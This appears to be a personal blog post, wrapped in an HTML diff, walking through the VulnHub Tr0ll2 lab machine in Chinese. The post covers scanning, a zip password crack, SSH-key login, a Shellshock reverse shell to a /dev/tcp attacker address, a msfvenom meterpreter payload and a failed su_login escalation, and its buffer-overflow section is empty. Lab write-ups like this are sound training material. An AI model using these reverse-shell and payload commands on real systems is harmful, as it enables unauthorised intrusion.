@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="forg12">
+    
+    <title>
+        
+            vulnhub-troll2... |
+        
+        forg12&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"forg1222.github.io","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"https://forg1222.github.io/images/head.jpeg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"https://forg1222.github.io/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"6.6.6"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+  </script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                forg12&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">vulnhub-troll2...</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="https://forg1222.github.io/images/head.jpeg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">forg12</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2022-08-09 15:13:13</span>
+        <span class="mobile">2022-08-09 15:13</span>
+    </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/vulnhub/">vulnhub</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>905 字</span>
+        </span>
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h1><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight shell"><figcaption><span>l</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.2.0/24                                                  </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-15 15:11 CST</span><br><span class="line">Nmap scan report for 192.168.2.1</span><br><span class="line">Host is up (0.0029s latency).</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.2.169</span><br><span class="line">Host is up (0.10s latency).</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.2.169                                                   </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org )</span><br><span class="line">Nmap scan report for 192.168.2.169</span><br><span class="line">Host is up (0.021s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.68 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="服务探针"><a href="#服务探针" class="headerlink" title="服务探针"></a>服务探针</h2><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.2.169/ -x 403</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/09/vulnhub-troll2/image-20220815151852333.png" alt="image-20220815151852333"></p>
+<h3 id="Robots-txt"><a href="#Robots-txt" class="headerlink" title="Robots.txt"></a>Robots.txt</h3><p><img src="/2022/08/09/vulnhub-troll2/image-20220815151956911.png" alt="image-20220815151956911"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.2.169/ -x 403 -w /home/kali/hk/troll2/url.txt </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/09/vulnhub-troll2/image-20220815153638680.png" alt="image-20220815153638680"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[15:35:38] 301 -  313B  - /noob  -&gt;  http://192.168.2.169/noob/             </span><br><span class="line">[15:35:38] 301 -  320B  - /keep_trying  -&gt;  http://192.168.2.169/keep_trying/</span><br><span class="line">[15:35:38] 301 -  322B  - /ok_this_is_it  -&gt;  http://192.168.2.169/ok_this_is_it/</span><br><span class="line">[15:35:38] 301 -  320B  - /dont_bother  -&gt;  http://192.168.2.169/dont_bother/</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>​	四个路径下都是这张图片，查看网页源码，发现图片名为cat the troll.jpg</p>
+<p><img src="/2022/08/09/vulnhub-troll2/image-20220815153945929.png" alt="image-20220815153945929"></p>
+<p><img src="/2022/08/09/vulnhub-troll2/image-20220815153954586.png" alt="image-20220815153954586"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.2.169/noob/cat_the_troll.jpg</span><br><span class="line">strings cat_the_troll.jpg </span><br></pre></td></tr></table></figure>
+
+<p>​	图片下载下来没看到有用信息，在想是不是其他几个图片中有信息，于是挨个下载下来。最终在第四个路径下的图片中找到了有用的信息。</p>
+<p><img src="/2022/08/09/vulnhub-troll2/image-20220815155243525.png" alt="image-20220815155243525"></p>
+<h3 id="x2F-y0ur-self"><a href="#x2F-y0ur-self" class="headerlink" title="&#x2F;y0ur_self"></a>&#x2F;y0ur_self</h3><p><img src="/2022/08/09/vulnhub-troll2/image-20220815155403742.png" alt="image-20220815155403742"></p>
+<p><img src="/2022/08/09/vulnhub-troll2/image-20220815155427097.png" alt="image-20220815155427097"></p>
+<p>​	字符被base64编码了，下载下来通过解码生成密码本。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat answer.txt | base64 -d &gt; dic.txt</span><br><span class="line">cat dic.txt </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/09/vulnhub-troll2/image-20220815160601934.png" alt="image-20220815160601934"></p>
+<h2 id="ftp登录"><a href="#ftp登录" class="headerlink" title="ftp登录"></a>ftp登录</h2><p>​	这里并没有地方去使用这个字典，回过头来登录一下ftp，这里提示来到的是Tr0ll FTP，尝试使用<code>Tr0ll/Tr0ll</code>进行登录，成功，如果这里未成功的话只能尝试爆破ftp或者ssh了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.2.169</span><br><span class="line">Connected to 192.168.2.169.</span><br><span class="line">220 Welcome to Tr0ll FTP... Only noobs stay for a while...</span><br><span class="line">Name (192.168.2.169:kali): Tr0ll</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: Tr0ll</span><br><span class="line">230 Login successful.</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/09/vulnhub-troll2/image-20220815160956868.png" alt="image-20220815160956868"></p>
+<h2 id="解压lmao-zip"><a href="#解压lmao-zip" class="headerlink" title="解压lmao.zip"></a>解压lmao.zip</h2><p>​	下载后发现解压需要密码，结合前面生成的字典进行爆破。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -D -p /home/kali/hk/troll2/dic.txt lmao.zip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == ItCantReallyBeThisEasyRightLOL</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2022/08/09/vulnhub-troll2/image-20220815161742676.png" alt="image-20220815161742676"></p>
+<p><img src="/2022/08/09/vulnhub-troll2/image-20220815161844298.png" alt="image-20220815161844298"></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>​	解压出来是RSA私钥，可以直接通过私钥登录。</p>
+<p><img src="/2022/08/09/vulnhub-troll2/image-20220815162021474.png" alt="image-20220815162021474"></p>
+<p><img src="/2022/08/09/vulnhub-troll2/image-20220815162318202.png" alt="image-20220815162318202"></p>
+<p><img src="/2022/08/09/vulnhub-troll2/image-20220815162943409.png" alt="image-20220815162943409"></p>
+<p>​	反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i noob noob@192.168.2.169 &#x27;() &#123; :;&#125;; bash -i &gt;&amp; /dev/tcp/192.168.2.168/2233 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/09/vulnhub-troll2/image-20220815163208803.png" alt="image-20220815163208803"></p>
+<p>kali监听反弹的shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 2233</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/09/vulnhub-troll2/image-20220815163321702.png" alt="image-20220815163321702"></p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="Lines-sh"><a href="#Lines-sh" class="headerlink" title="Lines.sh"></a>Lines.sh</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.2.168:1111/linpeas.sh</span><br><span class="line">chmod +x ./linpeas.sh</span><br><span class="line">./linpeas.sh</span><br></pre></td></tr></table></figure>
+
+<p>​	尝试了很多都没成功。</p>
+<h2 id="msf提权"><a href="#msf提权" class="headerlink" title="msf提权"></a>msf提权</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.2.172 lport=1122 -f elf &gt;a.elf</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; linux/x86/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (linux/x86/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.2.172    yes       The listen address (an interface</span><br><span class="line">                                      may be specified)</span><br><span class="line">   LPORT  1122             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.2.172:1122 </span><br><span class="line">[*] Sending stage (989032 bytes) to 192.168.2.169</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.2.172:1122 -&gt; 192.168.2.169:58803 )</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: noob</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/09/vulnhub-troll2/image-20220816144425250.png" alt="image-20220816144425250"></p>
+<p>​	通过msf的<code>local_exploit_suggester</code>对比只发现一个似乎可以提权:</p>
+<p><code>exploit/linux/local/su_login</code>，尝试后失败。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; use exploit/linux/local/su_login</span><br><span class="line">[*] Using configured payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(linux/local/su_login) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/local/su_login):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   PASSWORD                   no        Password to authenticate with</span><br><span class="line">                                        .</span><br><span class="line">   SESSION                    yes       The session to run this modul</span><br><span class="line">                                        e on</span><br><span class="line">   USERNAME  root             yes       Username to authenticate with</span><br><span class="line">                                        .</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (linux/x86/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface</span><br><span class="line">                                      may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Linux x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/local/su_login) &gt; set session 1 </span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 exploit(linux/local/su_login) &gt; set lhost 192.168.2.172 </span><br><span class="line">lhost =&gt; 192.168.2.172</span><br><span class="line">msf6 exploit(linux/local/su_login) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.2.172:4444 </span><br><span class="line">[*] Running automatic check (&quot;set AutoCheck false&quot; to disable)</span><br><span class="line">[+] The target appears to be vulnerable.</span><br><span class="line">[*] Uploading payload to target</span><br><span class="line">[*] Attempting to login with su</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/09/vulnhub-troll2/image-20220816144351709.png" alt="image-20220816144351709"></p>
+<h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><p>???</p>
+
+        </div>
+
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/vulnhub/">#vulnhub</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2022/08/10/vulnhub-stapler/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">vulnhub-stapler</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2022/08/08/vulnhub-IMF1/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">vulnhub-IMF1</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>
+              -
+            
+            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">forg12</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v6.6.6</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A6%82%E8%A6%81"><span class="nav-number">1.</span> <span class="nav-text">概要</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-number">2.1.</span> <span class="nav-text">主机发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E6%8E%A2%E9%92%88"><span class="nav-number">2.3.</span> <span class="nav-text">服务探针</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="nav-number">2.4.</span> <span class="nav-text">目录遍历</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Robots-txt"><span class="nav-number">2.4.1.</span> <span class="nav-text">Robots.txt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x2F-y0ur-self"><span class="nav-number">2.4.2.</span> <span class="nav-text">&#x2F;y0ur_self</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ftp%E7%99%BB%E5%BD%95"><span class="nav-number">2.5.</span> <span class="nav-text">ftp登录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E5%8E%8Blmao-zip"><span class="nav-number">2.6.</span> <span class="nav-text">解压lmao.zip</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">4.</span> <span class="nav-text">权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Lines-sh"><span class="nav-number">4.1.</span> <span class="nav-text">Lines.sh</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msf%E6%8F%90%E6%9D%83"><span class="nav-number">4.2.</span> <span class="nav-text">msf提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="nav-number">4.3.</span> <span class="nav-text">缓冲区溢出</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
